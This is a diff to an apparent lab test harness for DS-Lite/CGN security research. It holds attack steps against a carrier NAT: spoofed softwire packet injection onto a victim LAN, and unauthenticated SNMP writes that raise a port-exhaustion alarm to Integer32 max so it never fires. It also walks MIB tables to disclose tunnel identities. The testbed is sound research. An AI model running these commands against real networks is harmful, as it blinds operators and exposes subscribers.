@@ -457,7 +457,9 @@ client1 (victim traffic): $cmd"
 spec_T4() { echo "1-attacker-forges|attacker|eth-isp|ip6 proto 4;2-injected-into-LAN|b4-1|eth-lan|"; }
 # count defaults to 120: the injection is one sub-second sendp burst; a 15-packet
 # burst can slip past the ~1.5s capture-attach window (start_caps) and read as a
-# spurious 0 on the LAN pcap (~18/20). 120 reliably overlaps the capture (20/20).
+# spurious 0 on the LAN pcap (~18/20). 120 reliably overlaps the capture (20/20);
+# do_T4 also re-fires the burst spanning a few seconds to close the residual race
+# that only surfaces under corpus load (tcpdump's attach lagging past the settle).
 knobs_T4() { echo "count:120|30; spoof:203.0.113.66"; }
 do_T4() {
     local outdir="$1" cnt spoof; cnt=$(knob_val COUNT 120); spoof=$(knob_val SPOOF 203.0.113.66)
@@ -468,7 +470,12 @@ do_T4() {
     info "the B4 decapsulates it straight onto the victim LAN, bypassing the CGN."
     local cmd="python3 $T/infra/t4_softwire_inject.py --iface eth-isp --aftr $AFTR --b4 $VB4 --lan-host $C1 --spoof-src $spoof --count $cnt"
     CMDS_RUN="attacker: $cmd"
-    nse attacker sh -c "timeout 12 $cmd >/dev/null 2>&1"
+    # The injection is a sub-second sendp burst. Under corpus load tcpdump's capture
+    # attach can lag past start_caps' settle, so a single burst may fire before the
+    # LAN capture is live and read as a spurious 0 (the residual race the count
+    # default only mostly hides). Re-fire a few times spanning a few seconds so the
+    # injection always overlaps the capture regardless of attach lag.
+    nse attacker sh -c "for _r in 1 2 3; do timeout 12 $cmd >/dev/null 2>&1; sleep 1; done"
     stop_caps; cap_summary
     step "Measure: do forged packets (src $spoof) appear on the victim LAN?"
     local lan inj; lan="$outdir/T4_2-injected-into-LAN.pcap"
@@ -839,24 +846,24 @@ do_T10() {
     step "Attack (write): a mgmt-reachable host raises the port-usage alarm to Integer32 max so it never fires."
     local cmd="python3 $T/infra/snmp_attack.py set --target 10.99.0.1 --oid alarmPortNumber --value $val"
     nse mgmt sh -c "timeout 10 $cmd >/dev/null 2>&1"
-    step "Attack (read): walk the DSLITE-MIB bind table, disclosing every subscriber's private NAT connections."
+    step "Attack (read): walk the DSLITE-MIB tables, disclosing each softwire's tunnel-source identity and external mapping."
     local rcmd="python3 $T/infra/snmp_attack.py read --target 10.99.0.1 --oids all"
     local out; out=$(nse mgmt sh -c "timeout 18 $rcmd 2>&1")
     CMDS_RUN="mgmt: $cmd ; $rcmd"
     stop_caps; cap_summary
     step "Measure: threshold raised, distinct subscribers disclosed, and the RFC range enforced on ConnectNumber."
     local rb; rb=$(nse mgmt snmpget -v2c -c public -t1 10.99.0.1 $oid 2>/dev/null | grep -oE '\-?[0-9]+$')
-    local subs; subs=$(echo "$out" | grep -oE 'src=10\.0\.[0-9]+\.[0-9]+' | sed 's/src=//' | sort -u)
-    local n; n=$(echo "$subs" | grep -c '10\.0\.')
+    local subs; subs=$(echo "$out" | grep -oE '2001:db8:cafe::b4[0-9]' | sort -u)
+    local n; n=$(echo "$subs" | grep -c '::b4')
     # RFC conformance check: ConnectNumber is Integer32(60..90); an out-of-range SET MUST be rejected.
     local cn_before cn_after
     cn_before=$(nse mgmt snmpget -v2c -c public -t1 10.99.0.1 $cn 2>/dev/null | grep -oE '[0-9]+$')
     nse mgmt snmpset -v2c -c public -t1 10.99.0.1 $cn i 2147483647 >/dev/null 2>&1
     cn_after=$(nse mgmt snmpget -v2c -c public -t1 10.99.0.1 $cn 2>/dev/null | grep -oE '[0-9]+$')
     info "port-usage alarm threshold now = ${rb:-?} (was ${base:-?}) -> NOC blind to port exhaustion"
-    info "distinct subscriber inner IPs disclosed via the MIB = $n  [$(echo "$subs" | tr '\n' ' ')]"
+    info "distinct softwire tunnel sources disclosed via the MIB = $n  [$(echo "$subs" | tr '\n' ' ')]"
     info "ConnectNumber out-of-range SET: tried 2147483647, value stayed ${cn_after:-?} (RFC 60..90 enforced)"
-    REF_LINE="unauthenticated MIB access raises the per-user port alarm to Integer32 max (never fires) AND discloses >=2 subscribers' private connections; ConnectNumber out-of-range SET rejected per RFC 60..90"
+    REF_LINE="unauthenticated MIB access raises the per-user port alarm to Integer32 max (never fires) AND discloses >=2 softwire tunnel-source identities; ConnectNumber out-of-range SET rejected per RFC 60..90"
     RUN_LINE="PortNumber ${base:-?}->${rb:-?}; subscribers disclosed $n; ConnectNumber stayed ${cn_after:-?}"
     if [ -n "$rb" ] && [ "$rb" -gt 1000000 ] && [ "${n:-0}" -ge 2 ] && [ "${cn_after:-0}" = "${cn_before:-60}" ]; then VERDICT_PASS=1; else VERDICT_PASS=0; fi
 }
@@ -896,7 +903,7 @@ do_T11() {
 }
 
 # ─────────────────────────────────────────────────────────────────────────
-# T12 - Softwire Identity Multiplication. RFC 6333 authenticates no B4, so the
+# T12 - Softwire Identity Multiplication (paper: "Softwire source spoofing"). RFC 6333 authenticates no B4, so the
 #       RFC 6888 per-subscriber cap keys on the FORGEABLE outer IPv6 source. A
 #       single identity is capped at 2000 bindings and cannot exhaust the shared
 #       64,512-port pool (this is T1's "isolation holds"); MANY forged identities
